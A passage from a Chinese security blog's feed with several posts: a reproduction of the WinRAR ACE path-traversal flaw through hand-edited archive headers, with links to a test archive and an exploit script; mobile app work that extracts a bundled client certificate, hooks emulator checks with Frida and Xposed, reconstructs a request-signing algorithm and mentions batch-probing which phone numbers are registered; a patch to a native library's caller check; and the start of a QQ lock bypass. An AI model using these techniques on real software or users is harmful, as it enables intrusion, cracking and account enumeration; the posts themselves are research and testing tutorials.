href="http://scz.617.cn:8/misc/201910241714.txt" target="_blank" rel="noopener">http://scz.617.cn:8/misc/201910241714.txt</a> （有详细注册码的算法以及注册机）</p><p>[2].<a href="http://www.520monkey.com/archives/1295" target="_blank" rel="noopener">http://www.520monkey.com/archives/1295</a> （有分析和修改）</p><p>[3].<a href="https://www.freebuf.com/sectool/205520.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/205520.html</a> （有详细的javassist使用）</p><p>…</p>]]></content>
      
      
      <categories>
          
          <category> 软件破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Charles破解 </tag>
            
            <tag> 软件破解 </tag>
            
            <tag> javassist </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinRAR漏洞复现过程</title>
      <link href="/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/"/>
      <url>/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>近日Check Point团队爆出了一个关于WinRAR存在19年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用WinRAR解压该恶意文件时便会触发漏洞。</p><a id="more"></a><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库<code>UNACEV2.dll</code>所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><p>影响软件：</p><p>WinRAR     &lt; 5.70 Beta 1</p><p>Bandizip    &lt; = 6.2.0.0</p><p>好压(2345压缩)    &lt; = 5.9.8.10907</p><p>360压缩    &lt; = 4.0.0.1170</p><p>等等…</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>该漏洞的实现过程：首先新建一个任意文件，然后利用WinACE进行压缩，修改filename来实现目录穿越漏洞，可以将文件解压到任意目录中。</p><p>主要所需工具<a href="https://web.archive.org/web/20170714193504/http:/winace.com:80/" target="_blank" rel="noopener"><code>WinACE</code></a>、010Editor。</p><p>下载WinACE并安装，安装完成后新建一个文本文件，名字任意。</p><p><img src="01.png" alt></p><p>然后利用WinACE进行压缩。</p><p><img src="02.png" alt></p><p>然后我们下载<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">acefile.py</a>脚本。</p><p>使用命令<code>python acefile.py --headers liehu.ace</code>来读取该文件头信息。</p><p><img src="03.png" alt></p><p>根据漏洞的描述，问题是出现在filename中的。那主要就看下面的header吧。</p><p>用010Editor打开该文件。</p><p><img src="04.png" alt></p><p>需要看选中的部分。对比acefile解析的结果，并明白各个段对应的内容。</p><p><img src="05.png" alt></p><p>如果要修改filename，则需要修改上面标注这几处。第一处为0x4e9a(hdr_crc),第二处为0x0044(hdr_size)，第三处为0x0025(filename的长度），以及最后一处为filename。</p><p>修改顺序是由后到前。</p><p>这里修改filename为<code>d:\d:\liehu.txt</code></p><p>长度为15，对应的hex为0x000f</p><p><img src="06.png" alt></p><p>然后修改hdr_size，长度为46，对应的hex为0x002E。</p><p><img src="07.png" alt></p><p>接下来就是修改hdr_crc了，这里有一个取巧的方法。</p><p>我们再次运行命令<code>python acefile.py --headers liehu.ace</code></p><p>程序中断并提示<code>CorruptedArchiveError: header CRC failed</code></p><p>定位到错误的位置</p><p><img src="08.png" alt></p><p>这里<code>ace_crc16(buf)</code>的值就是ace文件0x4e9a对应的值，直接打印出该值并将该位置的值修改即可。</p><p><img src="09.png" alt></p><p>对应的值为63232，转换为hex为0xF700。</p><p><img src="10.png" alt></p><p>最后文件内容为</p><p><img src="11.png" alt></p><p>再次查看，可以正常解析，并看到filename已经修改成功</p><p><img src="12.png" alt></p><p>右键解压该文件，则会在D盘生成一个liehu.txt文件。</p><p><img src="13.png" alt></p><p>测试文件：</p><p><a href="https://fuping.site/files/liehu.ace">https://fuping.site/files/liehu.ace</a></p><blockquote><p>解压后会在D盘生成一个liehu.txt文件</p></blockquote><p>测试脚本：</p><p><a href="https://github.com/fupinglee/MyPython/blob/master/exploit/WinRAR_exploit/WinRAR_exploit.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/exploit/WinRAR_exploit/WinRAR_exploit.py</a></p><h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><p>有两种方式</p><ol><li><p>升级到最新版本，WinRAR 目前版本是 5.70 Beta 1</p></li><li><p>删除UNACEV2.dll文件</p></li></ol><p><img src="14.png" alt></p><p>此时再次解压恶意文件会提示如下错误：</p><p><img src="15.png" alt></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinRAR漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓APP测试之双向证书认证</title>
      <link href="/2019/02/13/SoulAPP-SSL-Bypass/"/>
      <url>/2019/02/13/SoulAPP-SSL-Bypass/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在《<a href="https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/">安卓APP测试之HOOK大法-Frida篇</a>》文章中有一个双向证书认证没详细说明，经过<strong>孔已己</strong>的提示，现在补充一下。</p><a id="more"></a><h2 id="0x02-双向证书认证与解决方法"><a href="#0x02-双向证书认证与解决方法" class="headerlink" title="0x02 双向证书认证与解决方法"></a>0x02 双向证书认证与解决方法</h2><p>在对soulApp进行抓包的时候，提示<strong><code>网络错误,请检查网络后重试~</code></strong></p><p><img src="01.png" alt></p><p>本来以为直接把这个okhttp的证书hook修改成系统默认的即可，就没有详细说明这一部分，结果有网友问双向证书认证这部分是如何处理的，就详细来说明一下如何处理。这里时由于采用了双向证书认证的缘故，所以抓包返回400错误，直接浏览器访问<a href="https://account.soulapp.cn/" target="_blank" rel="noopener">https://account.soulapp.cn/</a> ，也是不行的</p><p><img src="02.png" alt></p><p>提示<code>No required SSL certificate was sent.</code>如果要访问成功，就要带上证书。</p><blockquote><p>关于双向证书认证：客户端有自己的密匙，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。详细的内容可以参考<a href="https://blog.csdn.net/enweitech/article/details/53813183。" target="_blank" rel="noopener">https://blog.csdn.net/enweitech/article/details/53813183。</a></p></blockquote><p>我们本地来测试一下，简单介绍一下如何搭建双向证书认证环境。</p><h3 id="1-双向证书认证服务器的搭建"><a href="#1-双向证书认证服务器的搭建" class="headerlink" title="1.双向证书认证服务器的搭建"></a>1.双向证书认证服务器的搭建</h3><p><strong>创建一个证书的步骤：</strong> </p><p><strong>（1）生成系统私钥</strong></p><p><strong>（2）生成待签名证书</strong></p><p><strong>（3）生成x509证书, 用CA私钥进行签名</strong></p><blockquote><p>证书的生成过程略。</p></blockquote><p>以tomcat服务器为例。将生成的服务端证书<code>server.p12</code>和客户端信任证书<code>truststore.jks</code>放入conf目录下。修改tomcat下conf/server.xml文件，去掉https的注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot;</span><br><span class="line">               maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot;</span><br><span class="line">               clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot;</span><br><span class="line">truststoreFile&#x3D;&quot;conf&#x2F;truststore.jks&quot; truststorePass&#x3D;&quot;123456&quot; truststoreType&#x3D;&quot;JKS&quot;</span><br><span class="line">    keystoreFile&#x3D;&quot;conf&#x2F;server.p12&quot; keystorePass&#x3D;&quot;123456&quot; keystoreType&#x3D;&quot;PKCS12&quot; </span><br><span class="line">    maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot;</span><br><span class="line">    clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>此时<code>clientAuth=&quot;false&quot;</code>，未开启客户端校验。</p></blockquote><p>启动服务器并访问。</p><p><img src="03.png" alt></p><p>虽然提示错误但是点继续前往即可访问。</p><p><img src="04.png" alt></p><p>设置开启客户端校验，即<code>clientAuth=&quot;true&quot;</code></p><p>然后重启后访问</p><p><img src="05.png" alt></p><p>无法正常访问，想要正常访问，浏览器导入证书即可</p><p><img src="06.png" alt></p><p>下一步然后输入密码</p><p><img src="07.png" alt></p><p>刷新页面，提示选择证书。</p><p><img src="08.png" alt></p><p>确定后即可访问。</p><h3 id="2-soulAPP双向认证解决方法"><a href="#2-soulAPP双向认证解决方法" class="headerlink" title="2.soulAPP双向认证解决方法"></a>2.soulAPP双向认证解决方法</h3><p>同理这里soulApp也可以这样做。</p><p>这里列举三种方法来完成客户端的验证。归根结底都是证书的利用。</p><h4 id="a-浏览器导入证书"><a href="#a-浏览器导入证书" class="headerlink" title="a)浏览器导入证书"></a>a)浏览器导入证书</h4><p>利用soulApp中的证书和密码生成浏览器证书。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -inkey client.key -in client.crt -out soulclient.pfx</span><br></pre></td></tr></table></figure><blockquote><p>证书的位置位于资源文件assets中。</p></blockquote><p><img src="09.png" alt></p><blockquote><p>标记的1处输入的是soul证书的密码，2和3为证书导入浏览器自己设置的密码，这里为123456</p></blockquote><p>然后导入浏览器，重新访问<a href="https://account.soulapp.cn/" target="_blank" rel="noopener">https://account.soulapp.cn/</a></p><p><img src="10.png" alt></p><p>选择证书后确定。</p><p><img src="https://i.imgur.com/63SKzUi.png" alt></p><p>根据页面显示内容可以发现此时导入证书后可以正常访问。</p><h4 id="b-利用程序完成认证"><a href="#b-利用程序完成认证" class="headerlink" title="b)利用程序完成认证"></a>b)利用程序完成认证</h4><p>利用程序的话，参考<code>cn.soulapp.android.api.e.a()</code>方法，进行证书的操作。</p><p><img src="11.png" alt></p><p>精简之后主要代码如下：</p><p><img src="12.png" alt></p><p>然后利用httpclient进行http请求。</p><p>当访问不加证书的效果：</p><p><img src="13.png" alt></p><p>使用证书的结果：</p><p><img src="14.png" alt></p><blockquote><p>由于这是这是之前的数据包，所以已经过期，再次使用需要更换时间戳和签名，但结果成功的。</p></blockquote><h4 id="c-利用抓包工具"><a href="#c-利用抓包工具" class="headerlink" title="c)利用抓包工具"></a>c)利用抓包工具</h4><p>使用抓包工具，这里以burp为例。</p><p>未导入证书抓包结果：</p><p><img src="15.png" alt></p><p>提示400错误，我们在burp中导入证书</p><p><img src="16.png" alt></p><p>选择证书并输入密码。</p><p><img src="17.png" alt></p><p>证书导入成功。</p><p><img src="18.png" alt></p><p>再次抓包</p><p><img src="19.png" alt></p><p>已经可以正常抓取了。</p><p>当然使用其他方法也是可行的，这里就不再列举了。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>本文主要是为了解决APP与服务器之间的双向证书认证问题，没有太多的技巧，主要就是证书的使用。如果服务器采用了双向认证，那么一般在APP中有证书和证书密码的存在，找到之后导入抓包工具即可。</p>]]></content>
      
      
      <categories>
          
          <category> Android技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoulAPP </tag>
            
            <tag> 双向证书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓APP测试之HOOK大法-Xposed篇</title>
      <link href="/2019/01/28/Xposed-Hook-SoulApp/"/>
      <url>/2019/01/28/Xposed-Hook-SoulApp/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p><a href="https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/">安卓APP测试之HOOK大法-Frida篇</a>是基于Frida来实现HOOK，对于部分用户来说，一方面手机ROOT会带来一些风险，另一方面虽然愿意承担风险但是手机无法ROOT。这就需要采用另外一种方法–利用Xposed来进行HOOK。安装VirtualXposed之后，并不需要对手机进行ROOT，也可以来运行Xposed模块进行HOOK。</p><a id="more"></a><p><a href="https://github.com/android-hacker/VirtualXposed" target="_blank" rel="noopener">VirtualXposed</a>是基于<a href="https://github.com/asLody/VirtualApp" target="_blank" rel="noopener">VirtualApp</a> 和 <a href="https://github.com/tiann/epic" target="_blank" rel="noopener">epic</a> 在<strong>非ROOT</strong>环境下运行Xposed模块的实现（支持5.0~9.0)，就像它的介绍那样，<code>Use Xposed with a simple APP, without needing to root, unlock the bootloader, or flash a system image.</code>可以运行Xposed，不需要root，也不需要BL解锁和刷机。</p><h2 id="0x02-环境准备"><a href="#0x02-环境准备" class="headerlink" title="0x02 环境准备"></a>0x02 环境准备</h2><p>手机还是采用魅族Mx4，关闭ROOT权限。</p><p><img src="01.png" alt></p><p><img src="02.png" alt></p><p>下载并安装VirtualXposed，下载地址：<a href="https://github.com/android-hacker/VirtualXposed/releases" target="_blank" rel="noopener">https://github.com/android-hacker/VirtualXposed/releases</a></p><p>安装：</p><p><code>adb install VirtualXposed_0.16.1.apk</code></p><p>安装VirtualXposed之后，然后把手机上的APP安装到VirtualXposed上。</p><p><img src="03.png" alt></p><blockquote><p>由于VirtualXposed自带Xposed，这里我们只将需要的APP安装上去即可。</p></blockquote><p>开发Xposed模块采用的是Android Studio。</p><p>新建一个APP项目，添加依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">provided &#39;de.robv.android.xposed:api:82&#39;</span><br><span class="line">provided &#39;de.robv.android.xposed:api:82:sources&#39;</span><br></pre></td></tr></table></figure><p><img src="04.png" alt></p><p>新建一个Main类，并实现<code>IXposedHookLoadPackage</code>接口。</p><p><img src="05.png" alt></p><p>在src/main下新建一个<code>Assets Folder</code>。</p><p><img src="06.png" alt></p><p>并在其中新建一个名称为<code>xposed_init</code>的文件，内容是实现HOOK的类，这里是<code>com.fuping.soulhook.Main</code>。</p><p>在AndroidManifest.xml中指定模块的名称</p><p><img src="07.png" alt></p><p>环境准备好了，下面就是模块的开发和HOOK了。</p><h2 id="0x03-利用Xposed进行HOOK"><a href="#0x03-利用Xposed进行HOOK" class="headerlink" title="0x03 利用Xposed进行HOOK"></a>0x03 利用Xposed进行HOOK</h2><p>由于上篇文章已经分析过了，这里就不进行分析了，打开app会提示<code>SoulApp 暂不支持模拟器，请稍后再试~</code>。我们需要对<code>cn.soulapp.android.utils.j.e()</code>进行HOOK，令其返回为false。</p><p>上面模块的框架已经搭好了，直接写HOOK代码，主要代码如下：</p><p><img src="08.png" alt></p><blockquote><p>注意，利用Android Studio进行模块的编写时，需要禁用<code>Instant Run</code>(<code>File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Instant Run</code>)。</p></blockquote><p>然后打包安装。再利用VirtualXposed将编写的HOOK模块添加到VirtualXposed中。</p><p><img src="09.png" alt></p><p>查看安装的app</p><p><img src="10.png" alt></p><p>然后在VirtualXposed中打开Xposed Installer，在模块中勾选soulHook。</p><p><img src="11.png" alt></p><p>重启VirtualXposed。</p><blockquote><p>Xposed模块每次修改都需要重启手机，在VirtualXposed中时，只需重启VirtualXposed即可，而且速度极快。</p></blockquote><p>在VirtualXposed中打开soulapp，并查看logcat输出内容。</p><p><img src="12.png" alt></p><p>APP可以正常进入，说明HOOK成功。</p><p>剩下的也比较简单了，例如查看<code>com.gongjiao.rr.tools.f.b</code>参数。</p><p>主要代码：</p><p><img src="13.png" alt></p><p>运行输入手机号查看Log信息：</p><p><img src="14.png" alt></p><p>也是毫无问题可以获取到参数的内容的。</p><p>获取到参数内容后，根据上篇文章的算法的分析，就可以自己构造进行加密了。</p><p>例如利用Python来实现，可以批量探测用户是否注册。</p><p><img src="15.png" alt></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本来Frida和Xposed是作为一篇文章的，但是由于篇幅问题分成了两篇。这两篇文章主要通过两种方式来进行HOOK，主要是为了说明HOOK的好处，没有说是为了对比哪个好哪个不好的。不过通过测试，如果安装了VirtualXposed，Xposed应该还是略胜一筹吧。第一点无需ROOT即可运行，第二点是解决了需要重启手机的麻烦（利用VirtualXposed可以秒重启），第三点就是携带方便了。不过各有各的好处，根据自己的习惯选择。也可以先用Frida进行HOOK，毕竟测试比较方便，然后最后移植到Xposed上。</p>]]></content>
      
      
      <categories>
          
          <category> Android技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓Hook </tag>
            
            <tag> SoulAPP </tag>
            
            <tag> Xposed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓APP测试之HOOK大法-Frida篇</title>
      <link href="/2019/01/25/Frida-Hook-SoulAPP/"/>
      <url>/2019/01/25/Frida-Hook-SoulAPP/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>一般测试APP都是先设置代理，然后抓包进行测试。但是大多数情况下，抓取的数据包都含有参数校验，一旦修改其中一个参数之后，就会返回签名错误。</p><a id="more"></a><p>例如：</p><p><img src="01.png" alt></p><p>还有的有时间校验，当过去某一时间段后，该数据包就失效了。</p><p><img src="02.png" alt></p><p>因此如果想要去重放或者修改数据包进行FUZZ的话，就要弄清楚其中的加密sign值的算法。</p><p>本文以某app老版本为例(仅为技术研究)，主要目的是利用Frida进行HOOK进而去获取其api-sign的加密算法。</p><h2 id="0x02-环境准备"><a href="#0x02-环境准备" class="headerlink" title="0x02 环境准备"></a>0x02 环境准备</h2><p>这里手机采用魅族X4，刷了CM13.0，开启ROOT权限。</p><p>APP版本为v3.0.10，下载地址：<a href="https://www.wandoujia.com/apps/cn.soulapp.android/history_v18080100" target="_blank" rel="noopener">https://www.wandoujia.com/apps/cn.soulapp.android/history_v18080100</a></p><p>然后就是Frida环境的准备了。</p><p><strong>Frida</strong>是一款基于Python + JavaScript 的Hook与调试框架，在Android\Linux\Windows等平台均能使用。这里我们以<strong>Windows</strong>来对Android应用程序进行Hook。Frida的官网地址是：<a href="https://www.frida.re/" target="_blank" rel="noopener">https://www.frida.re。</a></p><p>安装方法也很简单：<code>pip install frida-tools</code>。</p><p>手机开启开发者模式，并开启USB调试。</p><p>下载frida-server，下载地址为：<a href="http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。" target="_blank" rel="noopener">http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。</a></p><p>上传到手机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server /data/<span class="built_in">local</span>/tmp/</span><br></pre></td></tr></table></figure><p>添加权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@mx4:/ <span class="comment">#chmod 777 frida-server</span></span><br></pre></td></tr></table></figure><p>手机上运行frida-server，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@mx4:&#x2F; #.&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server</span><br></pre></td></tr></table></figure><p>端口转发,电脑上运行如下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><p>环境准备好了，就开始对APP进行测试。</p><h2 id="0x03-利用Frida进行HOOK"><a href="#0x03-利用Frida进行HOOK" class="headerlink" title="0x03 利用Frida进行HOOK"></a>0x03 利用Frida进行HOOK</h2><p>安装后打开APP。</p><p><img src="03.png" alt></p><p>发现APP闪退，并提示<code>SoulApp 暂不支持模拟器，请稍后再试~</code>。</p><p>用jadx打开apk文件，搜索关键字<code>模拟器</code>。</p><p><img src="04.png" alt></p><p>只有一处，我们点进去。</p><p><img src="05.png" alt></p><p>其中有个判断，如果<code>cn.soulapp.android.utils.j.e()</code>为true，则提示不支持模拟器，并退出程序。点进这个方法查看。</p><p><img src="06.png" alt></p><p>其中有多个判断，如果一个为true，则返回true，最简单有效的方法就是hook，直接令其返回为false。使用Frida进行hook，代码如下：</p><p><img src="07.png" alt></p><p>运行后，发现再次打开app，可以顺利进入了。</p><p><img src="08.png" alt></p><p>输入手机号，点击确定。</p><p><img src="09.png" alt></p><p>提示<code>网络错误</code>，这是因为使用了代理，所以报错，但是有数据包的。可以暂时先不管这里。我们目的是获取sign值的加密算法。这里是获取api-sign的加密算法。</p><p>数据包内容</p><p><img src="10.png" alt></p><p>数据包中有<code>api-sign</code>，所以直接利用jadx搜索<code>api-sign</code>。</p><p><img src="11.png" alt></p><p>发现在cn.soulapp.android.api.b.b.b()中有调用，进入查看。</p><p><img src="12.png" alt></p><p>api-sign值的获取调用了<code>cn.soulapp.android.api.b.c.a</code>方法。</p><p><img src="13.png" alt></p><p>这里是创建了一个stringBuilder，经过拼接后，调用com.gongjiao.rr.tools.f.b进行sha1加密，并转换为大写。我们需要知道cn.soulapp.android.api.b.c.a三个参数的值是什么。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aVar.b(<span class="string">"api-sign"</span>, c.a(aaVar, replaceAll, currentTimeMillis));</span><br></pre></td></tr></table></figure><p>根据代码可以推测，第一个参数<code>aaVar</code>是类<code>okhttp3.Request</code>的实例化；</p><p>第二个参数<code>replaceAll</code>是获取的UUID去除中间的<code>&quot;-&quot;</code>；</p><p>第三个参数是当前时间戳减去<code>cn.soulapp.android.api.a.a()</code>。这个值是从<code>soul_share.xml</code>中读取<code>ApiConstants_timeDiff</code>的值，查看<code>soul_share.xml</code>发现内容为空。</p><p><img src="14.png" alt></p><p>所以第三个参数为当前的时间戳。</p><p>查看<code>cn.soulapp.android.api.b.c.a</code>方法，前半部分是对<code>aaVar</code>进行操作，大概是获取请求的路径，然后对参数进行拼接。</p><p>看后半部分的代码：</p><p><img src="15.png" alt></p><p>这里第71行中的<code>UTDevice.getUtdid(SoulApp.b())</code>为设备号，即数据包里面的<code>device-id</code>；</p><p>第72行的a.j为固定值，这里为10000003；</p><p>第73行这个值需要获取，可以用hook获取；</p><p>第74行a(j)是将传入的时间戳(第三个参数)进行转换；</p><p>第75行是拼接了传入的第二个参数；</p><p>第78行拼接了固定值3010；</p><p>然后第80行调用com.gongjiao.rr.tools.f.b对stringBuilder进行加密，并转换为大写。</p><p>可以通过hook的方法直接获取<code>cn.soulapp.android.api.b.c.a</code>和<code>com.gongjiao.rr.tools.f.b</code>的参数。</p><p>主要代码：</p><p><img src="16.png" alt></p><blockquote><p>由于<code>cn.soulapp.android.api.b.c</code>中有多个a方法，所以这里用了重载，指明参数类型来确定是哪个方法。</p></blockquote><p>运行效果</p><p><img src="17.png" alt></p><p>知道了加密算法以及参数，就可以自己实现加密获取api-sign了，如下所示：</p><p><img src="18.png" alt></p><p>api-sign值可以获取了，我们试一下能否利用。由上面知道代理抓包时数据包返回400，经过查看代码是可以解决这个问题的。这里不详细说明。</p><p><img src="19.png" alt></p><p>发现该方法获取api-sign是可行的。</p><h2 id="0x04-其他问题"><a href="#0x04-其他问题" class="headerlink" title="0x04 其他问题"></a>0x04 其他问题</h2><h3 id="1-不进行hook获取参数的内容或者查看调用堆栈的方法"><a href="#1-不进行hook获取参数的内容或者查看调用堆栈的方法" class="headerlink" title="1.不进行hook获取参数的内容或者查看调用堆栈的方法"></a>1.不进行hook获取参数的内容或者查看调用堆栈的方法</h3><p>可以通过动态调试的方法进行查看。</p><p>首先将apk反编译为smali文件，然后IDEA安装smalidea插件。下载地址：<a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="noopener">https://bitbucket.org/JesusFreke/smali/downloads/</a></p><p>反编译的命令如下：</p><p><code>java -jar baksmali-2.2.2.jar d 106_3ce8a91b116f3ca28175affa3d12083f.apk -o SoulApp3010/src</code></p><p>然后导入到idea中</p><p><img src="20.png" alt></p><p>然后在需要查看的地方下断点。</p><p>例如在<code>cn.soulapp.android.api.b.c.a</code>下断点</p><p><img src="21.png" alt></p><p>打开Run/Debug Configurations，添加一个远程调试，端口8700</p><p>运行app，然后在Android Device Monitor中选中</p><p><img src="22.png" alt></p><p>打开调试按钮，点击手机上的确定，进入调试。</p><p><img src="23.png" alt></p><h3 id="2-加密的算法在so文件中"><a href="#2-加密的算法在so文件中" class="headerlink" title="2.加密的算法在so文件中"></a>2.加密的算法在so文件中</h3><p>简单的方法就是获取调用so中方法的参数，然后自己写一个app，调用其so文件。</p><p>如果有判断的话，可以修改so文件达到可以调用的目的。</p><p><img src="24.png" alt></p><p>如上所示，该so文件有判断，如果isInMyAPP为false，则会退出，返回null。</p><p>我们可以修改<code>CMP R0,#0</code>为<code>CMP R0,#1</code>来绕过该限制。</p><p>修改后</p><p><img src="25.png" alt></p><p>更深入的就是对so文件进行分析，找到其中的加密算法。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>Frida不仅可以用于hook java层，也可以进行native层的hook。利用Frida进行hook时，要求需要使用已ROOT的手机，对于手机无法ROOT的，安装<a href="https://github.com/android-hacker/VirtualXposed" target="_blank" rel="noopener">VirtualXposed</a>后使用Xposed框架也可以进行HOOK。这里就不说明了，有兴趣的可以去试一试。</p>]]></content>
      
      
      <categories>
          
          <category> Android技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓Hook </tag>
            
            <tag> Frida </tag>
            
            <tag> SoulAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows版本QQ锁定可被绕过</title>
      <link href="/2018/11/19/QQ-Lock-bypass/"/>
      <url>/2018/11/19/QQ-Lock-bypass/</url>
      
        <content type="html"><![CDATA[<p>在使用某抢票软件的时候，由于要设置抢票成功后的通知，就用了QQ通知。结果发现当QQ在锁定时，也可以获取到QQ的控制面板进行操作，竟然绕过了QQ的锁定，于是就去尝试如何实现QQ锁定的绕过。</p><a id="more"></a><p><img src="640.png" alt="虚线阴影分割线"></p><h1 id="情景还原"><a href="#情景还原" class="headerlink" title="情景还原"></a>情景还原</h1><hr><p>首先演示一下如何使用抢票软件进行QQ锁定的绕过。这里以最新版本<a href="https://dldir1.qq.com/qqfile/qq/QQ9.0.7/24121/QQ9.0.7.24121.exe" target="_blank" rel="noopener">9.0.7（24121）</a>为例。下载后正常安装。</p><p><img src="01.png" alt="1542639823372"></p><p>安装后查看版本。</p><p><img src="02.png" alt="1542640660482"></p><p>将QQ锁定，然后打开软件，选择QQ通知，点击“获取聊天窗口”，此时会进行QQ窗体的加载，然后在“要发送的窗口”下拉框会显示一个随机字符串，点击“测试发送”按钮，会发现QQ控制面板弹出。</p><p><img src="03.png" alt="1542641095561"></p><p>而且是可以进行未锁定前的所有功能。如发送和接收消息，如图所示。</p><p><img src="04.png" alt="1542720813184"></p><h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><p>刚开始的想法是首先获取QQ窗口的句柄，然后再利用句柄进行显示与隐藏。</p><h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一"></a>尝试一</h2><p>这里采用的是精易编程助手来获取句柄，当qq处于非锁定状态，获取QQ窗体句柄后，可以利用句柄对QQ进行隐藏或显示，即使把QQ锁定，也可以进行隐藏或者显示。</p><p><img src="05.gif" alt="1542722213724"></p><p>但是当QQ隐藏后，此时再获取句柄后，无法绕过QQ的锁定。这时候获取的句柄为QQ锁定状态的句柄。</p><p><img src="06.gif" alt="1542722213724"></p><blockquote><p>该方法只能对未锁定的QQ进行操作，锁定后就无法获取控制面板句柄了，因此该方法行不通。</p></blockquote><h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二"></a>尝试二</h2><p>放弃了精易编程助手，采用更专业的工具spy++。找到句柄后发现标题为一串随机的字符串，与抢票工具获取聊天窗口中标题一样。</p><p><img src="07.png" alt="1542724530787"></p><p>猜测需要最终需要获取的句柄就是这个，句柄对应的十六进制为504BE，然后调用windows api进行窗口的显示和隐藏。</p><p>显示窗口<code>ShowWindow (句柄, 